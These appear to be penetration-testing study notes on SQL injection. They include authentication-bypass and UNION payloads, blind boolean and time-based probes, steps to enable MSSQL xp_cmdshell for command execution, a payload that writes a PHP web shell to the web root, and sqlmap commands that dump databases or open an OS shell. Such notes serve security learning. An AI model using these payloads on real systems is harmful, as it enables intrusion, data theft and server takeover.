* Inject unsanitized strings containing SQL payloads which executes unintended SQL commands.
* Example injection: offsec' OR 1=1 -- //
* Union based payloads: union queries provides results from multiple tables in statement.
	* Conditions for the queries to work:
		* All of the queries add after the first query must have the same numbers of columns as the first query result..
		* Datatypes for the columns must be compatible.
* In-Band: The vulnerable application provides the result of the query along with the application-returned value. In general this involves enabling sql debugging which is disabled websites in production. 
	* Find number of columns of a query:
		* 'ORDER BY 1-- // injection does not give an error since the 1st column exists in the query. Similarly 'ORDER BY n-- // injection, if it works it implies that nth column works and there are atleast n columns in the query. If it doesnt it and gives an error implies there are atmost < n columns in the query.
	* Craft the union payloads with the knowledge of number columns in query. Example: ' UNION SELECT null, null, database(), user(), @@version  -- // nulls might need to be inserted to exclude incompatible data columns types.
* Blind Injections: Injections where the results of the SQL injection query may be visible.
	* Assume for the below the motive to verify if a user exists (user enumeration) from a login page. One can use time or boolean basd logic to query if the user exists and infer results from the output of the page.
	* Boolean based: offsec' AND 1=1 -- // If it works it means values offsec exists.
	* Time based:  offsec' AND IF (1=1, sleep(3),'false') -- // if offsec exists then the result will be outputted after 3 seconds.
* Manual SQL injection into RCE:
	* MSSQL has xp_cmdshell which can be used to execute shell commands. It is disabled by default and can be enabled by an administrator.
	* Login into mssql using impacket-mssqlclient user:password@ip -windows-auth
	* Use the following commands to enable xp_cmdshell:
		* EXECUTE sp_configure 'show advanced options', 1;
		* RECONFIGURE;
		* EXECUTE sp_configure 'xp_cmdshell', 1;
		* RECONFIGURE;
	* SQL shell: EXECUTE xp_cmdshell 'command';
	* SQL shell can be upgraded to web shell by writing a command in for example php to a file and access it on URL maybe using directory traversal. 
	* Writing a php webshell file using SQL: ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
* Automated SQL injection:
	* sqlmap: Automated SQL injection tool. Not recommended for under the radar.
	* Example: sqlmap -u hxxp://host/blindsqli.php?user=1 -p user. where user is the vulnerable paramater.
	* sqlmap -u hxxp://host/blindsqli.php?user=1 -p user --dump. dumps the database.
	* sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp". post.txt is the post request including headers, item is the vulnerable parameter, --os-shell opens a shell, --web-root is the location of the webroot of the application.
